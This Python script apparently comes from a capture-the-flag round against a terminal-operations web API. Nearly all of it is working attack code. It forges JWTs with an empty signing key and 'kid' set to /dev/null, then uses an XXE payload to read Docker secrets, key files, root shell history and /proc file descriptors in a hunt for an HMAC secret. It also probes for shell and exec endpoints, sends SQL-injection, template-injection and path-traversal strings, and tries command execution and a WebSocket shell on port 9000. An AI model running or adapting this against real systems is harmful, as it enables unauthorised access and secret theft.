#!/usr/bin/env python3
"""round57 — Deep hunt for PROBE_SECRET: Docker secrets, proc fd, diagnostics API"""
import requests, time, json, hmac as hm, hashlib, base64, re

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"
S = requests.Session()

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator"):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":"/dev/null"},separators=(',',':')).encode()
    p = json.dumps({"sub":"ctf","company":"X","role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(b'', m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

KNOWN_URL = "http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
KNOWN_SIG = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"

def xxe_read(path, field="remarks"):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = S.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=10)
        return r.status_code, r.text
    except Exception as e:
        return -1, str(e)

def try_read(path, label=""):
    code, text = xxe_read(path)
    if code == 200:
        try:
            data = json.loads(text)
            val = data.get("ticket", {}).get("remarks", "")
            if val and val != "R":
                print(f"  READABLE {path}: {val[:200]}")
                return val
            else:
                print(f"  EMPTY {path} (200 but no content)")
                return ""
        except:
            print(f"  READABLE {path}: {text[:200]}")
            return text
    elif code == 400:
        print(f"  EXISTS but unreadable (400) {path}")
        return None
    elif code == 500:
        print(f"  ERROR (500) {path}")
        return None
    else:
        print(f"  NOT FOUND ({code}) {path}")
        return None

def verify_secret(candidate):
    sig = hm.new(candidate.encode(), KNOWN_URL.encode(), hashlib.sha256).hexdigest()
    if sig == KNOWN_SIG:
        print(f"\n{'='*60}")
        print(f"*** PROBE_SECRET CONFIRMED: {candidate} ***")
        print(f"{'='*60}")
        return True
    return False

# ============================================================
print("="*70)
print("PHASE 1: DOCKER SECRETS (/run/secrets/)")
print("="*70)

docker_secret_paths = [
    "/run/secrets/PROBE_SECRET",
    "/run/secrets/probe_secret",
    "/run/secrets/probe-secret",
    "/run/secrets/ProbeSecret",
    "/run/secrets/hmac_secret",
    "/run/secrets/hmac_key",
    "/run/secrets/signing_key",
    "/run/secrets/secret_key",
    "/run/secrets/api_key",
    "/run/secrets/app_secret",
    "/run/secrets/flask_secret",
    "/run/secrets/jwt_secret",
    "/run/secrets/secret",
    "/run/secrets/key",
    "/run/secrets/probe",
    # Vault-style
    "/vault/secrets/probe",
    "/vault/secrets/config",
    "/etc/secrets/probe_secret",
    "/app/secrets/probe_secret",
    "/app/.secrets",
]

for p in docker_secret_paths:
    val = try_read(p)
    if val and verify_secret(val.strip()):
        break

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: ALTERNATIVE KEY FILE PATHS")
print("="*70)

key_paths = [
    "/app/keys/probe_secret",
    "/app/keys/probe-secret",
    "/app/keys/PROBE_SECRET",
    "/app/keys/hmac",
    "/app/keys/hmac_key",
    "/app/keys/signing",
    "/app/keys/signing_key",
    "/app/keys/secret",
    "/app/keys/default",
    "/app/keys/master",
    "/app/keys/gauge",
    "/app/keys/gauge-gw",
    "/app/probe_secret",
    "/app/probe_secret.key",
    "/app/secret.key",
    "/app/hmac.key",
    "/app/.probe_secret",
    "/app/.secret",
    "/app/.env.local",
    "/app/.env.production",
    "/app/.env.docker",
    "/opt/keys/probe",
    "/opt/secrets/probe",
    "/etc/caspiterminal/probe_secret",
    "/etc/probe_secret",
]

for p in key_paths:
    val = try_read(p)
    if val and verify_secret(val.strip()):
        break

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: ENVIRONMENT/CONFIG FILES")
print("="*70)

env_paths = [
    "/etc/environment",
    "/root/.bashrc",
    "/root/.profile",
    "/root/.bash_history",
    "/etc/profile",
    "/etc/profile.d/probe.sh",
    "/etc/profile.d/app.sh",
    "/etc/profile.d/env.sh",
    "/etc/default/caspiterminal",
    "/etc/sysconfig/caspiterminal",
    "/home/app/.bashrc",
    "/home/app/.profile",
    "/home/gunicorn/.bashrc",
    "/app/.dockerenv",
    "/app/config.yaml",
    "/app/config.json",
    "/app/config.toml",
    "/app/settings.py",
    "/app/settings.json",
    "/app/probe_config.py",
    "/app/probe_config.json",
    # Supervisor / process manager
    "/etc/supervisor/conf.d/app.conf",
    "/etc/supervisor/supervisord.conf",
    "/etc/init.d/caspiterminal",
]

for p in env_paths:
    val = try_read(p)
    if val:
        # Search for PROBE_SECRET in content
        for line in val.split('\n'):
            if 'PROBE' in line.upper() or 'SECRET' in line.upper() or 'HMAC' in line.upper():
                print(f"    *** INTERESTING LINE: {line.strip()} ***")
                # Try to extract value
                m = re.search(r'[=:]\s*["\']?([^"\';\s]+)', line)
                if m:
                    verify_secret(m.group(1))

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: /proc/self/fd/* (OPEN FILE DESCRIPTORS)")
print("="*70)

for fd in range(20):
    val = try_read(f"/proc/self/fd/{fd}")
    if val:
        if 'PROBE' in val.upper() or 'SECRET' in val.upper():
            print(f"    *** FD {fd} HAS SECRET-RELATED CONTENT ***")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: /api/ops/diagnostics DEEP EXPLORATION")
print("="*70)

# GET diagnostics
try:
    r = S.get(f"{CASPI}/api/ops/diagnostics", headers=AUTH_OP, timeout=5)
    print(f"  GET /api/ops/diagnostics [{r.status_code}]: {r.text[:500]}")
    if r.status_code == 200:
        try:
            data = r.json()
            print(f"  Keys: {list(data.keys()) if isinstance(data, dict) else type(data)}")
            # Deep inspect
            print(f"  Full response: {json.dumps(data, indent=2)[:2000]}")
        except:
            pass
except Exception as e:
    print(f"  Error: {e}")

# POST diagnostics
try:
    r = S.post(f"{CASPI}/api/ops/diagnostics",
               json={"action": "dump", "target": "env"},
               headers={**AUTH_OP, "Content-Type":"application/json"}, timeout=5)
    print(f"\n  POST /api/ops/diagnostics [{r.status_code}]: {r.text[:500]}")
except Exception as e:
    print(f"  POST error: {e}")

# Sub-paths of diagnostics
for sub in ["/env", "/config", "/health", "/status", "/info", "/probe",
            "/secrets", "/keys", "/debug", "/dump", "/vars", "/settings",
            "/system", "/process", "/memory", "/threads"]:
    try:
        r = S.get(f"{CASPI}/api/ops/diagnostics{sub}", headers=AUTH_OP, timeout=3)
        if r.status_code != 404:
            print(f"  [{r.status_code}] /api/ops/diagnostics{sub}: {r.text[:200]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: OTHER API ENDPOINTS")
print("="*70)

# Try all possible API paths we haven't tested
api_paths = [
    "/api/ops/probe/config",
    "/api/ops/probe/key",
    "/api/ops/probe/secret",
    "/api/ops/probe/debug",
    "/api/ops/probe/info",
    "/api/ops/probe/status",
    "/api/ops/probe/test",
    "/api/ops/probe/list",
    "/api/ops/probe/devices",
    "/api/ops/config",
    "/api/ops/env",
    "/api/ops/secret",
    "/api/ops/keys",
    "/api/ops/status",
    "/api/ops/info",
    "/api/ops/debug",
    "/api/ops/shell",
    "/api/ops/exec",
    "/api/ops/llehs",
    "/api/config",
    "/api/env",
    "/api/debug",
    "/api/status",
    "/api/info",
    "/api/health",
    "/api/version",
    "/api/secret",
    "/api/shell",
    "/api/exec",
    "/api/llehs",
    "/api/probe",
    "/api/admin",
    "/api/internal",
    "/api/system",
    "/api/ops/custody/list",
    "/api/ops/custody/export",
    "/api/ops/custody/tickets",
    "/debug",
    "/admin",
    "/config",
    "/env",
    "/internal",
    "/metrics",
    "/prometheus",
    "/.env",
    "/.git/config",
    "/swagger.json",
    "/openapi.json",
    "/api-docs",
    # LLEHS-related
    "/shell",
    "/llehs",
    "/reverse",
    "/rce",
    "/cmd",
    "/command",
    "/api/cmd",
    "/api/command",
    "/api/run",
    "/api/execute",
]

for path in api_paths:
    for method in [S.get, S.post]:
        try:
            kwargs = {"headers": AUTH_OP, "timeout": 3}
            if method == S.post:
                kwargs["json"] = {}
            r = method(f"{CASPI}{path}", **kwargs)
            if r.status_code not in [404, 405]:
                mname = "POST" if method == S.post else "GET"
                print(f"  [{r.status_code}] {mname} {path}: {r.text[:200]}")
        except:
            pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: PROBE SIGN — EXTRACT HMAC ALGORITHM DETAILS")
print("="*70)

# What if probe/sign leaks info with special device names?
special_devices = [
    "' OR 1=1--",
    "{{7*7}}",
    "${7*7}",
    "../../../etc/passwd",
    "lm-01' UNION SELECT 1--",
    "__proto__",
    "constructor",
    "toString",
    "__class__",
    "PROBE_SECRET",
    "*",
    "all",
    "list",
    "help",
    "debug",
    "test",
    "admin",
    "config",
    "env",
    "llehs",
    # Different casing / variations
    "LM-01",
    "Lm-01",
    "lm01",
    "loading-arm-1",
]

for dev in special_devices:
    try:
        r = S.get(f"{CASPI}/api/ops/probe/sign",
                  params={"device": dev},
                  headers=AUTH_OP, timeout=3)
        if r.status_code == 200:
            data = r.json()
            print(f"  [200] device={dev!r}: {data}")
        elif r.status_code != 404 and r.status_code != 400:
            print(f"  [{r.status_code}] device={dev!r}: {r.text[:100]}")
    except:
        pass

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: PORT 9000 — DEEPER INVESTIGATION")
print("="*70)

P9000 = f"http://{HOST}:9000"

# POST methods to /healthz and /
for path in ["/healthz", "/", "/shell", "/exec", "/llehs", "/api"]:
    for method, mname in [(S.post, "POST"), (S.put, "PUT"), (S.delete, "DELETE"), (S.patch, "PATCH")]:
        try:
            r = method(f"{P9000}{path}", json={"cmd": "id"}, timeout=3)
            if r.status_code not in [404, 405]:
                print(f"  [{r.status_code}] {mname} :{path}: {r.text[:200]}")
        except:
            pass

# Different Content-Types to /healthz
for ct in ["text/plain", "text/xml", "application/xml", "application/x-www-form-urlencoded",
           "multipart/form-data"]:
    try:
        r = S.post(f"{P9000}/healthz", data="cmd=id",
                   headers={"Content-Type": ct}, timeout=3)
        if r.status_code == 200 and r.text != "ok":
            print(f"  [200] POST /healthz [{ct}]: {r.text[:200]}")
    except:
        pass

# Custom headers
for hdr, val in [("X-Forwarded-For", "127.0.0.1"),
                 ("X-Real-IP", "127.0.0.1"),
                 ("X-Custom-Auth", "admin"),
                 ("Authorization", f"Bearer {jwt_forged('admin')}"),
                 ("X-Api-Key", "probe_secret"),
                 ("X-Shell", "true")]:
    try:
        r = S.get(f"{P9000}/", headers={hdr: val}, timeout=3)
        if r.status_code != 404:
            print(f"  [GET / with {hdr}] [{r.status_code}]: {r.text[:100]}")
    except:
        pass

# WebSocket upgrade attempt
try:
    import websocket
    ws = websocket.create_connection(f"ws://{HOST}:9000/", timeout=3)
    print(f"  WebSocket connected!")
    ws.send("id")
    result = ws.recv()
    print(f"  WS recv: {result}")
    ws.close()
except ImportError:
    # Try raw socket WebSocket handshake
    import socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((HOST, 9000))
    ws_req = (
        "GET /shell HTTP/1.1\r\n"
        f"Host: {HOST}:9000\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
        "Sec-WebSocket-Version: 13\r\n\r\n"
    )
    sock.send(ws_req.encode())
    resp = sock.recv(4096)
    print(f"  WebSocket /shell: {resp[:300]}")
    sock.close()
except Exception as e:
    print(f"  WebSocket: {str(e)[:100]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
